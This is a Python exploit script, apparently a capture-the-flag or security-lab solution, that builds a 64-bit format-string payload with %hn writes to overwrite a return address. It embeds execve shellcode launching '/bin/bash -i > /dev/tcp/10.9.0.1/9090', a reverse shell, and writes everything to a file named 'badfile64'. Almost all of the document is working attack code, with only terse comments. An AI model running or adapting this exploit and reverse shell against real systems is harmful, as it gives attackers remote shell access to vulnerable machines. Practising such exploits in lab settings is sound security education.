#!/usr/bin/python3
import sys

# 64-bit Generic Shellcode 
shellcode_64 = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   #"/bin/ls -l; echo '===== Success! ======'                  *"
   "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

N = 1500
# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Choose the shellcode version based on your target
shellcode = shellcode_64
buf_addr = 0x00007fffffffe380
ebp_addr = 0x00007fffffffe2c0
ret_addr = ebp_addr + 0x8

start = 1500 - len(shellcode)
content[start:start+len(shellcode)] = shellcode
shell_addr = buf_addr + start
print("shell code addr: %#.16x" % shell_addr)

# shift is 34. so reture address is 34+8=42
############################################################
a1 = (shell_addr&0x000000000000ffff)
a2 = (shell_addr&0x00000000ffff0000) >> 16
a3 = (shell_addr&0x0000ffff00000000) >> 32

l = [a1, a2, a3]
l.sort()

d = {a1:ret_addr, a2:ret_addr+0x2, a3:ret_addr+0x4}
# num1, num2, num3 don't exceed 0xFFFFFFFF = 4294967295
# on the other hand, they don't exceed 11 strings
# so format string doesn't exceed 63 strings
# we can choose the start of ret_addr as 64, 72, 80
num1 = l[0]
num2 = l[1] - l[0]
num3 = l[2] - l[1]
s = "%." + str(num1) + "x" + "%42$hn" + "%." + str(num2) + "x" + "%43$hn" + "%." + str(num3) + "x" "%44$hn"
fmt = (s).encode('latin-1')
content[0:0+len(fmt)] = fmt
print(len(fmt))
content[64:72] = (d[l[0]]).to_bytes(8,byteorder='little')
content[72:80] = (d[l[1]]).to_bytes(8,byteorder='little')
content[80:88] = (d[l[2]]).to_bytes(8,byteorder='little')
############################################################

# Save the format string to file
with open('badfile64', 'wb') as f:
  f.write(content)
